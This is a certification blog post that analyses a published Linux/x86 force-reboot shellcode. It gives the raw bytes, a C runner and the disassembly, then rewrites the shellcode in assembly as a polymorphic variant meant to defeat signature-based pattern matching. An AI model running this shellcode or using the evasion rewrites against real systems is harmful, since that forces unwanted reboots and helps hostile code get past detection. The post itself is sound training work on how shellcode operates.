---
layout: post
title: SLAE 6.1 - Shell-Storm Polymorphism - force reboot
date:   2019-03-04
categories: [SLAE, Assembly]
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

The sixth question for the SLAE exam is to create polymorphic versions of 3 shellcodes from Shell-Storm to attempt to beat pattern matching, this is part 1 of 3 for this question.  The requirements are:
* Select a linux/x86 shellcode from Shell-Storm.org
* UThe polymorphic versions cannot be larger than 150% of the original shellcode
* Bonus points for making it shorter in length

The first piece of shellcode we will try to create a polymorphic version of will be:

http://shell-storm.org/shellcode/files/shellcode-831.php
```
**********************************************
* Linux/x86 Force Reboot shellcode 36 bytes  *
**********************************************
* Author: Hamza Megahed                      *
**********************************************
* Twitter: @Hamza_Mega                       *
**********************************************
* blog: hamza-mega[dot]blogspot[dot]com      *
**********************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com *
**********************************************

xor    %eax,%eax
push   %eax
push   $0x746f6f62
push   $0x65722f6e
push   $0x6962732f
mov    %esp,%ebx
push   %eax
pushw  $0x662d
mov    %esp,%esi
push   %eax
push   %esi
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

**********************************************

#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                  "\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                  "\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                  "\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
```
It says it is a force reboot shellcode.  Let's do some analysis before we run it just to verify that it does what it claims to do.

With how short the shellcode is, I'll check the instructions with ndisasm for a quick overview.
```
python -c "print '\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80'" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  68626F6F74        push dword 0x746f6f62
00000008  686E2F7265        push dword 0x65722f6e
0000000D  682F736269        push dword 0x6962732f
00000012  89E3              mov ebx,esp
00000014  50                push eax
00000015  66682D66          push word 0x662d
00000019  89E6              mov esi,esp
0000001B  50                push eax
0000001C  56                push esi
0000001D  53                push ebx
0000001E  89E1              mov ecx,esp
00000020  B00B              mov al,0xb
00000022  CD80              int 0x80
00000024  0A                db 0x0a
```
Summarizing what I am seeing at a high level before we dig in to more details:
```
* push null byte
* push what looks like a string
* 1st arg is the string
* push another null
* push another value (string)
* store string address in esi
* push null
* push 2nd string address
* push 1st string address
* move this struct into our 2nd arg
* syscall 11 - execve
```
So we have execve(string1, {string1 string2})

Let's check the strings:
```
>>> binascii.unhexlify('746f6f62')
'toob'
>>> binascii.unhexlify('65722f6e')
'er/n'
>>> binascii.unhexlify('6962732f')
'ibs/'
>>> binascii.unhexlify('662d')
'f-'
```
Little Endian - first string reads: /sbin/reboot

second string reads: -f

So our command is execve('/sbin/reboot', {'/sbin/reboot','-f'},0)

Now that we know the call it makes, I know what to expect and to look for.  Running it does restart the computer.

Let's begin making a polymorphic version of this..

This is a pretty short piece of shellcode so we can try to mix it up as much as we possible.. One of the requirements is that our version cannot be greater than 150% of the original. Given that our original is 36 bytes, we have to fit within 54 bytes.

The original starts by zeroing out EAX, which is a creative solution since EAX needs to be zeroed out at the end to mov 0xb into AL for the syscall.  I'll be using EDX as the null and just zero EAX later on right before the syscall. 

We can zero EDX with the instruction "cdq" which is a 1 byte opcode.  

The next step is to push "/sbin/reboot" to the stack, let's just split this so that we push word values instead of dword values. This might avoid detection on the dword pushes. Then, move the stack pointer into EBX, I am just going to leave this instruction.  So we are currently at:
```nasm
 cdq
 push edx

 push word 0x746f
 push word 0x6f62
 push word 0x6572
 push word 0x2f6e
 push word 0x6962
 push word 0x732f
 mov ebx, esp
```
Next, we are going to push a null terminated '-f' to the stack and move it's address in to ESI for safe keeping. push EDX since it is our NULL value and push the string '-f'. 
```nasm
 push edx
 push word 0x662d
 ```
Now we need to change this mov esi, esp.  I will use EAX since we will be changing it soon anyways.. EAX can be zero'd out by subtracting by itself to get 0, then we can just add esp to it.  So, we are essentially doing a mov eax, esp but using sub and add instructions.
 ```nasm
 sub eax, eax
 add eax, esp
```
Next, we create the args struct with a few push instructions.  I will push edx (NULL), push eax ('-f'), push ebx ('/sbin/reboot') then we need to move our stack pointer into ecx.  Let's do the sub - add replacement again for the mov.
```nasm
push edx
push eax
push ebx
sub ecx, ecx
add ecx, esp
```
The last instructions move 0xb into AL and then makes the syscall.  Since I decided to use EDX as the null and EAX has values in it, I have to zero it out and then move the right syscall value into AL.  Again, sub add replacement here, then the int 0x80.
```nasm
sub eax, eax
add al, 0xb
int 0x80
```
All done, our total bytes is 50 and it runs properly!  Let's put them side by side to show the differences.
```nasm
xor eax,eax                          cdq     
push eax                             push edx
push dword 0x746f6f62                push word 0x746f
                                     push word 0x6f62
push dword 0x65722f6e                push word 0x6572
                                     push word 0x2f6e
push dword 0x6962732f                push word 0x6962
                                     push word 0x732f
mov ebx,esp                          mov ebx, esp

push eax                             push edx
push word 0x662d                     push word 0x662d
mov esi,esp                          sub eax, eax
                                     add eax, esp
push eax                             push edx
push esi                             push eax
push ebx                             push ebx
mov ecx,esp                          sub ecx, ecx
                                     add ecx, esp
mov al,0xb                           sub eax, eax
                                     add al, 0xb
int 0x80                             int 0x80
```
